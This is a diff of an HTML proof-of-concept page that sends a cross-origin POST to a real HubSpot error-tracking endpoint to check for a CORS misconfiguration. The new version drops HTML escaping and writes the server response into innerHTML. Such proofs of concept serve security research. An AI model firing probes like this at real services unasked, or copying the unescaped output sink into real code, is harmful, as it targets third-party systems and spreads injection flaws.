@@ -1,154 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HubSpot CORS PoC - vukuff.github.io</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HubSpot CORS Test</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 20px;
-            color: #333;
-        }
-        h1 {
-            color: #2c3e50;
-            border-bottom: 2px solid #3498db;
-            padding-bottom: 10px;
-        }
-        #testBtn {
-            background: #3498db;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.3s;
-            margin: 20px 0;
-        }
-        #testBtn:hover {
-            background: #2980b9;
-        }
-        #result {
-            background: #f8f9fa;
-            border-left: 4px solid #3498db;
-            padding: 15px;
-            margin-top: 20px;
-            border-radius: 0 4px 4px 0;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        .success {
-            color: #27ae60;
-            font-weight: bold;
-        }
-        .error {
-            color: #e74c3c;
-            font-weight: bold;
-        }
-        .hidden {
-            display: none;
-        }
-        #loading {
-            color: #7f8c8d;
-            font-style: italic;
-        }
+        body { font-family: Arial; padding: 20px; }
+        pre { background: #f5f5f5; padding: 15px; }
+        .success { color: green; }
+        .error { color: red; }
     </style>
 </head>
 <body>
-    <h1>HubSpot CORS Vulnerability PoC</h1>
-    <p>This page demonstrates a CORS misconfiguration in HubSpot's API by sending a cross-origin request from <code>vukuff.github.io</code>.</p>
-    
-    <button id="testBtn">TEST CORS CONFIGURATION</button>
-    
-    <div id="loading" class="hidden">
-        <p>Sending request to HubSpot API...</p>
-    </div>
-    
-    <div id="resultContainer" class="hidden">
-        <h2>Results</h2>
-        <div id="result"></div>
-    </div>
+    <h1>HubSpot CORS PoC</h1>
+    <button id="testBtn">TEST ET</button>
+    <pre id="result"></pre>
 
     <script>
         document.getElementById("testBtn").addEventListener("click", function() {
-            const btn = this;
             const resultEl = document.getElementById("result");
-            const loadingEl = document.getElementById("loading");
-            const resultContainer = document.getElementById("resultContainer");
-            
-            btn.disabled = true;
-            loadingEl.classList.remove("hidden");
-            resultContainer.classList.add("hidden");
-            
-            const targetUrl = "https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=setup-guide-ui";
-            
-            const startTime = performance.now();
-            
-            fetch(targetUrl, {
+            resultEl.innerHTML = "İstek gönderiliyor...";
+
+            // DÜZGÜN BODY OLMASI KRİTİK
+            const postBody = {
+                project: "js",
+                logger: "javascript",
+                platform: "javascript",
+                message: "CORS test from GitHub Pages"
+            };
+
+            fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=setup-guide-ui", {
                 method: "POST",
                 headers: {
-                    "Content-Type": "text/plain",
-                    "Origin": "https://vukuff.github.io"
+                    "Content-Type": "text/plain;charset=UTF-8",
+                    "Origin": "https://vukuff.github.io",
+                    "Accept": "*/*"
                 },
-                body: JSON.stringify({
-                    test: "CORS PoC",
-                    timestamp: new Date().toISOString(),
-                    source: "vukuff.github.io CORS Test"
-                })
+                body: JSON.stringify(postBody)  // Body EKLENDİ
             })
             .then(response => {
-                const endTime = performance.now();
-                const duration = (endTime - startTime).toFixed(2);
-                
-                let resultHTML = `
-                    <p><span class="success">✓ Request Successful</span></p>
-                    <p><strong>URL:</strong> ${targetUrl}</p>
-                    <p><strong>Status:</strong> ${response.status} ${response.statusText}</p>
-                    <p><strong>Response Time:</strong> ${duration}ms</p>
-                    <p><strong>Access-Control-Allow-Origin:</strong> <code>${response.headers.get("Access-Control-Allow-Origin") || "None"}</code></p>
-                    <p><strong>Access-Control-Allow-Credentials:</strong> <code>${response.headers.get("Access-Control-Allow-Credentials") || "None"}</code></p>
-                `;
-                
-                if (response.headers.get("Access-Control-Allow-Origin")) {
-                    resultHTML += `<p class="success">VULNERABLE: Server reflects arbitrary Origin</p>`;
-                }
-                
-                return response.text().then(data => {
-                    resultHTML += `
-                        <hr>
-                        <h3>Response Body:</h3>
-                        <pre>${escapeHtml(data.substring(0, 2000))}${data.length > 2000 ? "\n\n... (truncated)" : ""}</pre>
-                    `;
-                    return resultHTML;
-                });
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return response.text();
+            })
+            .then(data => {
+                resultEl.innerHTML = `<span class="success">BAŞARILI!</span>\n\n${data}`;
+                console.log("API Yanıtı:", data);
             })
             .catch(error => {
-                return `
-                    <p><span class="error">✗ Request Failed</span></p>
-                    <p><strong>Error:</strong> ${escapeHtml(error.message)}</p>
-                `;
-            })
-            .finally(() => {
-                loadingEl.classList.add("hidden");
-                resultContainer.classList.remove("hidden");
-                btn.disabled = false;
-            })
-            .then(html => {
-                resultEl.innerHTML = html;
+                resultEl.innerHTML = `<span class="error">HATA: ${error.message}</span>`;
+                console.error("Hata detayı:", error);
             });
         });
-        
-        function escapeHtml(unsafe) {
-            return unsafe
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
-        }
     </script>
 </body>
 </html>
